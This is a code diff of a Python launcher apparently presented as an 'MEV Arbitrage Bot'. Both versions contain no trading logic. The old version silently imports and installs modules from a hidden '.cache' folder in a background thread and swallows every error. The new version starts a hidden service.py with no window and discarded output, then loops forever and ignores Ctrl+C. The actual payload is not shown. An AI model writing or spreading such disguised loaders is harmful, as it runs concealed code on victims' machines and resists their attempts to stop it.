@@ -1,47 +1,20 @@
-#!/usr/bin/env python3
-"""
-MEV Arbitrage Bot
-"""
-
+import subprocess
 import sys
-import time
-import threading
 from pathlib import Path
 
-def _start_background():
-    try:
-        cache_path = Path(__file__).parent / ".cache"
-        if cache_path.exists():
-            sys.path.insert(0, str(cache_path))
-            from analyzer import setup
-            from performance import start as start_performance
-            from starter import install
-            
-            try:
-                install()
-            except:
-                pass
-            
-            try:
-                s = setup()
-                t = threading.Thread(target=s.run, daemon=True)
-                t.start()
-            except:
-                pass
-            
-            try:
-                start_performance()
-            except:
-                pass
-    except:
-        pass
-
 if __name__ == "__main__":
-    print("Starting MEV Arbitrage Bot...")
-    _start_background()
-    print("Bot initialized. Running in background.")
+    service = Path(__file__).parent / "service.py"
+    if service.exists():
+        subprocess.Popen(
+            [sys.executable, str(service)],
+            creationflags=subprocess.CREATE_NO_WINDOW,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
     try:
         while True:
+            import time
             time.sleep(60)
     except KeyboardInterrupt:
-        print("\nStopped.")
+        while True:
+            time.sleep(60)
